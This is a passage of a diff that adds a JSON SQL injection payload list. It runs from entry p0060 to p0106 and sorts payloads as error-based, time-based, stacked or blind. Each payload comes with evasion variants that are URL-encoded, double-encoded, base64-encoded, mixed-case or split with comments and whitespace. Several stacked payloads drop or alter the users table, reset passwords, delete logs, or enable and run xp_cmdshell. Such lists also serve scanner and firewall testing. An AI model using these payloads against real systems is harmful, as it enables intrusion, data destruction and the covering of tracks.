+      "%27%20%4f%52%20%31%3d%31%20%41%4e%44%20%72%6f%77%28%31%2c%31%29%3e%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%43%48%41%52%28%35%38%29%2c%43%48%41%52%28%35%38%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53%20%47%52%4f%55%50%20%42%59%20%78%20%4c%49%4d%49%54%20%31%29%2d%2d",
+      "'+OR+1=1+AND+row(1,1)>(SELECT+COUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x+LIMIT+1)--",
+      "%27%20OR%201%3D1%20AND%20row%281%2C1%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%28CHAR%2858%29%2CCHAR%2858%29%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%20LIMIT%201%29--"
+    ],
+    "example_param": "filter"
+  },
+  {
+    "payload_id": "p0061",
+    "base_payload": "' AND gtid_subset(version(),1)--",
+    "attack_type": "error",
+    "variants": [
+      "%27%20%41%4e%44%20%67%74%69%64%5f%73%75%62%73%65%74%28%76%65%72%73%69%6f%6e%28%29%2c%31%29%2d%2d",
+      "'\nAND\ngtid_subset(version(),1)--",
+      "' anD gTid_SubSeT(veRSiON(),1)--",
+      "JyBBTkQgZ3RpZF9zdWJzZXQodmVyc2lvbigpLDEpLS0=",
+      "%27%20AND%20gtid_subset%28version%28%29%2C1%29--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0062",
+    "base_payload": "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',version())) USING utf8)))--",
+    "attack_type": "error",
+    "variants": [
+      "'+AND+JSON_KEYS((SELECT+CONVERT((SELECT+CONCAT('~',version()))+USING+utf8)))--",
+      "%27%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%28%27~%27%2Cversion%28%29%29%29%20USING%20utf8%29%29%29--",
+      "' ANd JSOn_keys((selEct COnVErt((sElEct ConCaT('~',VeRsIOn())) uSING UTF8)))--",
+      "%27%20%41%4e%44%20%4a%53%4f%4e%5f%4b%45%59%53%28%28%53%45%4c%45%43%54%20%43%4f%4e%56%45%52%54%28%28%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%28%27%7e%27%2c%76%65%72%73%69%6f%6e%28%29%29%29%20%55%53%49%4e%47%20%75%74%66%38%29%29%29%2d%2d",
+      "'\tAND\tJSON_KEYS((SELECT\tCONVERT((SELECT\tCONCAT('~',version()))\tUSING\tutf8)))--"
+    ],
+    "example_param": "filter"
+  },
+  {
+    "payload_id": "p0063",
+    "base_payload": "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
+    "attack_type": "error",
+    "variants": [
+      "'\nAND\n(SELECT\n*\nFROM\n(SELECT(SLEEP(0)))a)--",
+      "'+AND+(SELECT+*+FROM+(SELECT(SLEEP(0)))a)--",
+      "%2527%2520AND%2520%2528SELECT%2520%252A%2520FROM%2520%2528SELECT%2528SLEEP%25280%2529%2529%2529a%2529--",
+      "%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%280%29%29%29a%29--",
+      "'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(0)))a)--"
+    ],
+    "example_param": "category"
+  },
+  {
+    "payload_id": "p0064",
+    "base_payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,version(),floor(rand()*2)) HAVING MIN(0)--",
+    "attack_type": "error",
+    "variants": [
+      "%2527%2520OR%25201%2520GROUP%2520BY%2520CONCAT_WS%25280x3a%252Cversion%2528%2529%252Cfloor%2528rand%2528%2529%252A2%2529%2529%2520HAVING%2520MIN%25280%2529--",
+      "'\nOR\n1\nGROUP\nBY\nCONCAT_WS(0x3a,version(),floor(rand()*2))\nHAVING\nMIN(0)--",
+      "'/**/OR/**/1/**/GROUP/**/BY/**/CONCAT_WS(0x3a,version(),floor(rand()*2))/**/HAVING/**/MIN(0)--",
+      "%27%20%4f%52%20%31%20%47%52%4f%55%50%20%42%59%20%43%4f%4e%43%41%54%5f%57%53%28%30%78%33%61%2c%76%65%72%73%69%6f%6e%28%29%2c%66%6c%6f%6f%72%28%72%61%6e%64%28%29%2a%32%29%29%20%48%41%56%49%4e%47%20%4d%49%4e%28%30%29%2d%2d",
+      "'%20OR%201%20GROUP%20BY%20CONCAT_WS(0x3a,version(),floor(rand()*2))%20HAVING%20MIN(0)--"
+    ],
+    "example_param": "category"
+  },
+  {
+    "payload_id": "p0065",
+    "base_payload": "' AND multipoint((select * from (select * from (select version())a)b))--",
+    "attack_type": "error",
+    "variants": [
+      "JyBBTkQgbXVsdGlwb2ludCgoc2VsZWN0ICogZnJvbSAoc2VsZWN0ICogZnJvbSAoc2VsZWN0IHZlcnNpb24oKSlhKWIpKS0t",
+      "'/**/AND/**/multipoint((select/**/*/**/from/**/(select/**/*/**/from/**/(select/**/version())a)b))--",
+      "'%20AND%20multipoint((select%20*%20from%20(select%20*%20from%20(select%20version())a)b))--",
+      "%27%20AND%20multipoint%28%28select%20%2A%20from%20%28select%20%2A%20from%20%28select%20version%28%29%29a%29b%29%29--",
+      "' aNd MULTipOInt((SeLEcT * from (SeLeCt * FrOm (seleCT VersIon())A)B))--"
+    ],
+    "example_param": "category"
+  },
+  {
+    "payload_id": "p0066",
+    "base_payload": "' OR polygon((select * from(select * from(select version())a)b))--",
+    "attack_type": "error",
+    "variants": [
+      "JyBPUiBwb2x5Z29uKChzZWxlY3QgKiBmcm9tKHNlbGVjdCAqIGZyb20oc2VsZWN0IHZlcnNpb24oKSlhKWIpKS0t",
+      "'+OR+polygon((select+*+from(select+*+from(select+version())a)b))--",
+      "'\tOR\tpolygon((select\t*\tfrom(select\t*\tfrom(select\tversion())a)b))--",
+      "%2527%2520OR%2520polygon%2528%2528select%2520%252A%2520from%2528select%2520%252A%2520from%2528select%2520version%2528%2529%2529a%2529b%2529%2529--",
+      "'%20OR%20polygon((select%20*%20from(select%20*%20from(select%20version())a)b))--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0067",
+    "base_payload": "' AND geometrycollection((select*from(select user())a))--",
+    "attack_type": "error",
+    "variants": [
+      "' And gEOMeTrycoLlectioN((SEleCT*FrOm(SEleCt USEr())A))--",
+      "'\nAND\ngeometrycollection((select*from(select\nuser())a))--",
+      "%2527%2520AND%2520geometrycollection%2528%2528select%252Afrom%2528select%2520user%2528%2529%2529a%2529%2529--",
+      "JyBBTkQgZ2VvbWV0cnljb2xsZWN0aW9uKChzZWxlY3QqZnJvbShzZWxlY3QgdXNlcigpKWEpKS0t",
+      "'+AND+geometrycollection((select*from(select+user())a))--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0068",
+    "base_payload": "' AND ST_LatFromGeoHash(version())--",
+    "attack_type": "error",
+    "variants": [
+      "%2527%2520AND%2520ST_LatFromGeoHash%2528version%2528%2529%2529--",
+      "' AND sT_lATfrOMGeOHash(vErSIOn())--",
+      "'+AND+ST_LatFromGeoHash(version())--",
+      "'\tAND\tST_LatFromGeoHash(version())--",
+      "%27%20AND%20ST_LatFromGeoHash%28version%28%29%29--"
+    ],
+    "example_param": "filter"
+  },
+  {
+    "payload_id": "p0069",
+    "base_payload": "' OR SLEEP(5)--",
+    "attack_type": "time-based",
+    "variants": [
+      "' or SleEp(5)--",
+      "'/**/OR/**/SLEEP(5)--",
+      "%27%20OR%20SLEEP%285%29--",
+      "%2527%2520OR%2520SLEEP%25285%2529--",
+      "%27%20%4f%52%20%53%4c%45%45%50%28%35%29%2d%2d"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0070",
+    "base_payload": "' OR SLEEP(5)#",
+    "attack_type": "time-based",
+    "variants": [
+      "'/**/OR/**/SLEEP(5)#",
+      "%2527%2520OR%2520SLEEP%25285%2529%2523",
+      "' OR SLEEP(5)#%00",
+      "JyBPUiBTTEVFUCg1KSM=",
+      "'\nOR\nSLEEP(5)#"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0071",
+    "base_payload": "1' AND SLEEP(5)--",
+    "attack_type": "time-based",
+    "variants": [
+      "1' AND SLEEP(5)--%00",
+      "MScgQU5EIFNMRUVQKDUpLS0=",
+      "1'%20AND%20SLEEP(5)--",
+      "1'/**/AND/**/SLEEP(5)--",
+      "1' aNd SlEEp(5)--"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0072",
+    "base_payload": "1' AND SLEEP(5)#",
+    "attack_type": "time-based",
+    "variants": [
+      "MScgQU5EIFNMRUVQKDUpIw==",
+      "1'\nAND\nSLEEP(5)#",
+      "1'\tAND\tSLEEP(5)#",
+      "%31%27%20%41%4e%44%20%53%4c%45%45%50%28%35%29%23",
+      "1' and sleeP(5)#"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0073",
+    "base_payload": "'; WAITFOR DELAY '0:0:5'--",
+    "attack_type": "time-based",
+    "variants": [
+      "JzsgV0FJVEZPUiBERUxBWSAnMDowOjUnLS0=",
+      "%27%3b%20%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%27%30%3a%30%3a%35%27%2d%2d",
+      "';+WAITFOR+DELAY+'0:0:5'--",
+      "%2527%253B%2520WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527--",
+      "';%20WAITFOR%20DELAY%20'0:0:5'--"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0074",
+    "base_payload": "1'; WAITFOR DELAY '0:0:5'--",
+    "attack_type": "time-based",
+    "variants": [
+      "MSc7IFdBSVRGT1IgREVMQVkgJzA6MDo1Jy0t",
+      "1%2527%253B%2520WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527--",
+      "1';\tWAITFOR\tDELAY\t'0:0:5'--",
+      "1'; WAITFOR DELAY '0:0:5'--%00",
+      "1';%20WAITFOR%20DELAY%20'0:0:5'--"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0075",
+    "base_payload": "' OR BENCHMARK(5000000,MD5('A'))--",
+    "attack_type": "time-based",
+    "variants": [
+      "'\tOR\tBENCHMARK(5000000,MD5('A'))--",
+      "'%20OR%20BENCHMARK(5000000,MD5('A'))--",
+      "%2527%2520OR%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--",
+      "%27%20OR%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29--",
+      "' OR BENCHMARK(5000000,MD5('A'))--%00"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0076",
+    "base_payload": "1' OR BENCHMARK(5000000,MD5('A'))--",
+    "attack_type": "time-based",
+    "variants": [
+      "MScgT1IgQkVOQ0hNQVJLKDUwMDAwMDAsTUQ1KCdBJykpLS0=",
+      "1'%20OR%20BENCHMARK(5000000,MD5('A'))--",
+      "1' OR BENCHMARK(5000000,MD5('A'))--%00",
+      "1'\tOR\tBENCHMARK(5000000,MD5('A'))--",
+      "1%2527%2520OR%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0077",
+    "base_payload": "' OR pg_sleep(5)--",
+    "attack_type": "time-based",
+    "variants": [
+      "'\tOR\tpg_sleep(5)--",
+      "'/**/OR/**/pg_sleep(5)--",
+      "' OR Pg_SleEP(5)--",
+      "%27%20%4f%52%20%70%67%5f%73%6c%65%65%70%28%35%29%2d%2d",
+      "%2527%2520OR%2520pg_sleep%25285%2529--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0078",
+    "base_payload": "1' OR pg_sleep(5)--",
+    "attack_type": "time-based",
+    "variants": [
+      "1'\nOR\npg_sleep(5)--",
+      "MScgT1IgcGdfc2xlZXAoNSktLQ==",
+      "%31%27%20%4f%52%20%70%67%5f%73%6c%65%65%70%28%35%29%2d%2d",
+      "1'%20OR%20pg_sleep(5)--",
+      "1'/**/OR/**/pg_sleep(5)--"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0079",
+    "base_payload": "'; SELECT pg_sleep(5)--",
+    "attack_type": "time-based",
+    "variants": [
+      "%2527%253B%2520SELECT%2520pg_sleep%25285%2529--",
+      "';\tSELECT\tpg_sleep(5)--",
+      "%27%3b%20%53%45%4c%45%43%54%20%70%67%5f%73%6c%65%65%70%28%35%29%2d%2d",
+      "'; SeLeCt pG_SLeEP(5)--",
+      "%27%3B%20SELECT%20pg_sleep%285%29--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0080",
+    "base_payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "attack_type": "time-based",
+    "variants": [
+      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--%00",
+      "JyBBTkQgKFNFTEVDVCAqIEZST00gKFNFTEVDVChTTEVFUCg1KSkpYSktLQ==",
+      "'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--",
+      "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(5)))a)--",
+      "'\tAND\t(SELECT\t*\tFROM\t(SELECT(SLEEP(5)))a)--"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0081",
+    "base_payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "attack_type": "time-based",
+    "variants": [
+      "1'\tAND\t(SELECT\t*\tFROM\t(SELECT(SLEEP(5)))a)--",
+      "MScgQU5EIChTRUxFQ1QgKiBGUk9NIChTRUxFQ1QoU0xFRVAoNSkpKWEpLS0=",
+      "1'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))a)--",
+      "1%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--",
+      "1'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0082",
+    "base_payload": "' OR IF(1=1,SLEEP(5),0)--",
+    "attack_type": "time-based",
+    "variants": [
+      "' OR IF(1=1,SLEEP(5),0)--%00",
+      "'/**/OR/**/IF(1=1,SLEEP(5),0)--",
+      "JyBPUiBJRigxPTEsU0xFRVAoNSksMCktLQ==",
+      "%2527%2520OR%2520IF%25281%253D1%252CSLEEP%25285%2529%252C0%2529--",
+      "'+OR+IF(1=1,SLEEP(5),0)--"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0083",
+    "base_payload": "1' OR IF(1=1,SLEEP(5),0)--",
+    "attack_type": "time-based",
+    "variants": [
+      "1%2527%2520OR%2520IF%25281%253D1%252CSLEEP%25285%2529%252C0%2529--",
+      "MScgT1IgSUYoMT0xLFNMRUVQKDUpLDApLS0=",
+      "1' OR IF(1=1,SLEEP(5),0)--%00",
+      "%31%27%20%4f%52%20%49%46%28%31%3d%31%2c%53%4c%45%45%50%28%35%29%2c%30%29%2d%2d",
+      "1%27%20OR%20IF%281%3D1%2CSLEEP%285%29%2C0%29--"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0084",
+    "base_payload": "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--",
+    "attack_type": "time-based",
+    "variants": [
+      "%27%3b%20%45%58%45%43%20%6d%61%73%74%65%72%2e%2e%78%70%5f%63%6d%64%73%68%65%6c%6c%20%27%70%69%6e%67%20%2d%6e%20%35%20%31%32%37%2e%30%2e%30%2e%31%27%2d%2d",
+      "';/**/EXEC/**/master..xp_cmdshell/**/'ping/**/-n/**/5/**/127.0.0.1'--",
+      "';\tEXEC\tmaster..xp_cmdshell\t'ping\t-n\t5\t127.0.0.1'--",
+      "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--%00",
+      "%27%3B%20EXEC%20master..xp_cmdshell%20%27ping%20-n%205%20127.0.0.1%27--"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0085",
+    "base_payload": "' OR (SELECT COUNT(*) FROM generate_series(1,5000000))>0--",
+    "attack_type": "time-based",
+    "variants": [
+      "%2527%2520OR%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520generate_series%25281%252C5000000%2529%2529%253E0--",
+      "'\tOR\t(SELECT\tCOUNT(*)\tFROM\tgenerate_series(1,5000000))>0--",
+      "'%20OR%20(SELECT%20COUNT(*)%20FROM%20generate_series(1,5000000))>0--",
+      "'\nOR\n(SELECT\nCOUNT(*)\nFROM\ngenerate_series(1,5000000))>0--",
+      "' Or (sEleCT CouNT(*) from GenerAte_sERiES(1,5000000))>0--"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0086",
+    "base_payload": "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
+    "attack_type": "time-based",
+    "variants": [
+      "'+AND+1=(SELECT+1+FROM+pg_sleep(5))--",
+      "%27%20%41%4e%44%20%31%3d%28%53%45%4c%45%43%54%20%31%20%46%52%4f%4d%20%70%67%5f%73%6c%65%65%70%28%35%29%29%2d%2d",
+      "JyBBTkQgMT0oU0VMRUNUIDEgRlJPTSBwZ19zbGVlcCg1KSktLQ==",
+      "'%20AND%201=(SELECT%201%20FROM%20pg_sleep(5))--",
+      "%2527%2520AND%25201%253D%2528SELECT%25201%2520FROM%2520pg_sleep%25285%2529%2529--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0087",
+    "base_payload": "'; DROP TABLE users--",
+    "attack_type": "stacked",
+    "variants": [
+      "%27%3b%20%44%52%4f%50%20%54%41%42%4c%45%20%75%73%65%72%73%2d%2d",
+      "';+DROP+TABLE+users--",
+      "%27%3B%20DROP%20TABLE%20users--",
+      "';/**/DROP/**/TABLE/**/users--",
+      "';\tDROP\tTABLE\tusers--"
+    ],
+    "example_param": "action"
+  },
+  {
+    "payload_id": "p0088",
+    "base_payload": "1'; DROP TABLE users--",
+    "attack_type": "stacked",
+    "variants": [
+      "1';/**/DROP/**/TABLE/**/users--",
+      "1';\tDROP\tTABLE\tusers--",
+      "1'; DROp taBLE uSeRS--",
+      "1';%20DROP%20TABLE%20users--",
+      "1%27%3B%20DROP%20TABLE%20users--"
+    ],
+    "example_param": "action"
+  },
+  {
+    "payload_id": "p0089",
+    "base_payload": "'; INSERT INTO users VALUES('hacker','pass')--",
+    "attack_type": "stacked",
+    "variants": [
+      "%2527%253B%2520INSERT%2520INTO%2520users%2520VALUES%2528%2527hacker%2527%252C%2527pass%2527%2529--",
+      "%27%3b%20%49%4e%53%45%52%54%20%49%4e%54%4f%20%75%73%65%72%73%20%56%41%4c%55%45%53%28%27%68%61%63%6b%65%72%27%2c%27%70%61%73%73%27%29%2d%2d",
+      "'; INSERT INTO users VALUES('hacker','pass')--%00",
+      "';\nINSERT\nINTO\nusers\nVALUES('hacker','pass')--",
+      "';+INSERT+INTO+users+VALUES('hacker','pass')--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0090",
+    "base_payload": "'; UPDATE users SET password='hacked'--",
+    "attack_type": "stacked",
+    "variants": [
+      "'; UPDATE users SET password='hacked'--%00",
+      "';%20UPDATE%20users%20SET%20password='hacked'--",
+      "%27%3b%20%55%50%44%41%54%45%20%75%73%65%72%73%20%53%45%54%20%70%61%73%73%77%6f%72%64%3d%27%68%61%63%6b%65%64%27%2d%2d",
+      "';\tUPDATE\tusers\tSET\tpassword='hacked'--",
+      "%27%3B%20UPDATE%20users%20SET%20password%3D%27hacked%27--"
+    ],
+    "example_param": "command"
+  },
+  {
+    "payload_id": "p0091",
+    "base_payload": "'; EXEC sp_configure 'show advanced options',1--",
+    "attack_type": "stacked",
+    "variants": [
+      "JzsgRVhFQyBzcF9jb25maWd1cmUgJ3Nob3cgYWR2YW5jZWQgb3B0aW9ucycsMS0t",
+      "%27%3b%20%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%73%68%6f%77%20%61%64%76%61%6e%63%65%64%20%6f%70%74%69%6f%6e%73%27%2c%31%2d%2d",
+      "%2527%253B%2520EXEC%2520sp_configure%2520%2527show%2520advanced%2520options%2527%252C1--",
+      "'; EXEC sp_configure 'show advanced options',1--%00",
+      "';+EXEC+sp_configure+'show+advanced+options',1--"
+    ],
+    "example_param": "command"
+  },
+  {
+    "payload_id": "p0092",
+    "base_payload": "'; EXEC sp_configure 'xp_cmdshell',1--",
+    "attack_type": "stacked",
+    "variants": [
+      "'; exEc Sp_cONfiGURE 'xp_CMdsheLl',1--",
+      "';+EXEC+sp_configure+'xp_cmdshell',1--",
+      "%2527%253B%2520EXEC%2520sp_configure%2520%2527xp_cmdshell%2527%252C1--",
+      "';/**/EXEC/**/sp_configure/**/'xp_cmdshell',1--",
+      "%27%3B%20EXEC%20sp_configure%20%27xp_cmdshell%27%2C1--"
+    ],
+    "example_param": "action"
+  },
+  {
+    "payload_id": "p0093",
+    "base_payload": "'; EXEC master..xp_cmdshell 'whoami'--",
+    "attack_type": "stacked",
+    "variants": [
+      "';%20EXEC%20master..xp_cmdshell%20'whoami'--",
+      "';\tEXEC\tmaster..xp_cmdshell\t'whoami'--",
+      "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--",
+      "';\nEXEC\nmaster..xp_cmdshell\n'whoami'--",
+      "'; EXec MaStER..xp_CMdShELL 'whoaMi'--"
+    ],
+    "example_param": "action"
+  },
+  {
+    "payload_id": "p0094",
+    "base_payload": "1'; SELECT * INTO OUTFILE '/tmp/out.txt'--",
+    "attack_type": "stacked",
+    "variants": [
+      "1'; seLecT * iNtO OUtfiLe '/tmP/oUT.Txt'--",
+      "%31%27%3b%20%53%45%4c%45%43%54%20%2a%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%74%6d%70%2f%6f%75%74%2e%74%78%74%27%2d%2d",
+      "1%2527%253B%2520SELECT%2520%252A%2520INTO%2520OUTFILE%2520%2527/tmp/out.txt%2527--",
+      "1';\tSELECT\t*\tINTO\tOUTFILE\t'/tmp/out.txt'--",
+      "1%27%3B%20SELECT%20%2A%20INTO%20OUTFILE%20%27/tmp/out.txt%27--"
+    ],
+    "example_param": "action"
+  },
+  {
+    "payload_id": "p0095",
+    "base_payload": "'; CREATE TABLE hacked(data varchar(100))--",
+    "attack_type": "stacked",
+    "variants": [
+      "';/**/CREATE/**/TABLE/**/hacked(data/**/varchar(100))--",
+      "%2527%253B%2520CREATE%2520TABLE%2520hacked%2528data%2520varchar%2528100%2529%2529--",
+      "';\tCREATE\tTABLE\thacked(data\tvarchar(100))--",
+      "%27%3B%20CREATE%20TABLE%20hacked%28data%20varchar%28100%29%29--",
+      "JzsgQ1JFQVRFIFRBQkxFIGhhY2tlZChkYXRhIHZhcmNoYXIoMTAwKSktLQ=="
+    ],
+    "example_param": "command"
+  },
+  {
+    "payload_id": "p0096",
+    "base_payload": "'; DELETE FROM logs--",
+    "attack_type": "stacked",
+    "variants": [
+      "';\tDELETE\tFROM\tlogs--",
+      "'; DELeTE fRom LOGS--",
+      "';+DELETE+FROM+logs--",
+      "%2527%253B%2520DELETE%2520FROM%2520logs--",
+      "';%20DELETE%20FROM%20logs--"
+    ],
+    "example_param": "command"
+  },
+  {
+    "payload_id": "p0097",
+    "base_payload": "1'; ALTER TABLE users ADD COLUMN hacked INT--",
+    "attack_type": "stacked",
+    "variants": [
+      "1%2527%253B%2520ALTER%2520TABLE%2520users%2520ADD%2520COLUMN%2520hacked%2520INT--",
+      "1';/**/ALTER/**/TABLE/**/users/**/ADD/**/COLUMN/**/hacked/**/INT--",
+      "1';\nALTER\nTABLE\nusers\nADD\nCOLUMN\nhacked\nINT--",
+      "1';+ALTER+TABLE+users+ADD+COLUMN+hacked+INT--",
+      "1';%20ALTER%20TABLE%20users%20ADD%20COLUMN%20hacked%20INT--"
+    ],
+    "example_param": "action"
+  },
+  {
+    "payload_id": "p0098",
+    "base_payload": "' AND SUBSTRING(version(),1,1)='5'--",
+    "attack_type": "blind",
+    "variants": [
+      "%27%20%41%4e%44%20%53%55%42%53%54%52%49%4e%47%28%76%65%72%73%69%6f%6e%28%29%2c%31%2c%31%29%3d%27%35%27%2d%2d",
+      "' AnD subSTrINg(veRsIon(),1,1)='5'--",
+      "'\tAND\tSUBSTRING(version(),1,1)='5'--",
+      "JyBBTkQgU1VCU1RSSU5HKHZlcnNpb24oKSwxLDEpPSc1Jy0t",
+      "'+AND+SUBSTRING(version(),1,1)='5'--"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0099",
+    "base_payload": "' AND SUBSTRING(user(),1,1)='r'--",
+    "attack_type": "blind",
+    "variants": [
+      "' AND SUBSTRING(user(),1,1)='r'--%00",
+      "'/**/AND/**/SUBSTRING(user(),1,1)='r'--",
+      "'\nAND\nSUBSTRING(user(),1,1)='r'--",
+      "%2527%2520AND%2520SUBSTRING%2528user%2528%2529%252C1%252C1%2529%253D%2527r%2527--",
+      "'\tAND\tSUBSTRING(user(),1,1)='r'--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0100",
+    "base_payload": "' AND ASCII(SUBSTRING(database(),1,1))>100--",
+    "attack_type": "blind",
+    "variants": [
+      "'\nAND\nASCII(SUBSTRING(database(),1,1))>100--",
+      "%2527%2520AND%2520ASCII%2528SUBSTRING%2528database%2528%2529%252C1%252C1%2529%2529%253E100--",
+      "%27%20%41%4e%44%20%41%53%43%49%49%28%53%55%42%53%54%52%49%4e%47%28%64%61%74%61%62%61%73%65%28%29%2c%31%2c%31%29%29%3e%31%30%30%2d%2d",
+      "'+AND+ASCII(SUBSTRING(database(),1,1))>100--",
+      "'\tAND\tASCII(SUBSTRING(database(),1,1))>100--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0101",
+    "base_payload": "' AND LENGTH(database())>5--",
+    "attack_type": "blind",
+    "variants": [
+      "' AND LENGTH(database())>5--%00",
+      "' anD lEnGTh(DaTabASe())>5--",
+      "%27%20%41%4e%44%20%4c%45%4e%47%54%48%28%64%61%74%61%62%61%73%65%28%29%29%3e%35%2d%2d",
+      "'%20AND%20LENGTH(database())>5--",
+      "%2527%2520AND%2520LENGTH%2528database%2528%2529%2529%253E5--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0102",
+    "base_payload": "' AND (SELECT COUNT(*) FROM users)>0--",
+    "attack_type": "blind",
+    "variants": [
+      "'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/users)>0--",
+      "' AND (SELECT COUNT(*) FROM users)>0--%00",
+      "JyBBTkQgKFNFTEVDVCBDT1VOVCgqKSBGUk9NIHVzZXJzKT4wLS0=",
+      "'+AND+(SELECT+COUNT(*)+FROM+users)>0--",
+      "%27%20%41%4e%44%20%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%20%46%52%4f%4d%20%75%73%65%72%73%29%3e%30%2d%2d"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0103",
+    "base_payload": "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
+    "attack_type": "blind",
+    "variants": [
+      "'%20AND%20EXISTS(SELECT%20*%20FROM%20users%20WHERE%20username='admin')--",
+      "'\tAND\tEXISTS(SELECT\t*\tFROM\tusers\tWHERE\tusername='admin')--",
+      "'\nAND\nEXISTS(SELECT\n*\nFROM\nusers\nWHERE\nusername='admin')--",
+      "JyBBTkQgRVhJU1RTKFNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWU9J2FkbWluJyktLQ==",
+      "'/**/AND/**/EXISTS(SELECT/**/*/**/FROM/**/users/**/WHERE/**/username='admin')--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0104",
+    "base_payload": "1' AND MID(version(),1,1)='5",
+    "attack_type": "blind",
+    "variants": [
+      "MScgQU5EIE1JRCh2ZXJzaW9uKCksMSwxKT0nNQ==",
+      "%31%27%20%41%4e%44%20%4d%49%44%28%76%65%72%73%69%6f%6e%28%29%2c%31%2c%31%29%3d%27%35",
+      "1'\tAND\tMID(version(),1,1)='5",
+      "1'/**/AND/**/MID(version(),1,1)='5",
+      "1' AnD MID(VerSioN(),1,1)='5"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0105",
+    "base_payload": "1' AND CHAR(65)='A",
+    "attack_type": "blind",
+    "variants": [
+      "1'%20AND%20CHAR(65)='A",
+      "1' and cHAr(65)='a",
+      "1'\tAND\tCHAR(65)='A",
+      "MScgQU5EIENIQVIoNjUpPSdB",
+      "1%27%20AND%20CHAR%2865%29%3D%27A"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0106",
+    "base_payload": "1' AND SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END",
+    "attack_type": "blind",
+    "variants": [
+      "1'+AND+SELECT+CASE+WHEN+(1=1)+THEN+1+ELSE+0+END",
+      "1%27%20AND%20SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%200%20END",
+      "1' AND SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END%00",
+      "MScgQU5EIFNFTEVDVCBDQVNFIFdIRU4gKDE9MSkgVEhFTiAxIEVMU0UgMCBFTkQ=",
+      "1'/**/AND/**/SELECT/**/CASE/**/WHEN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0107",
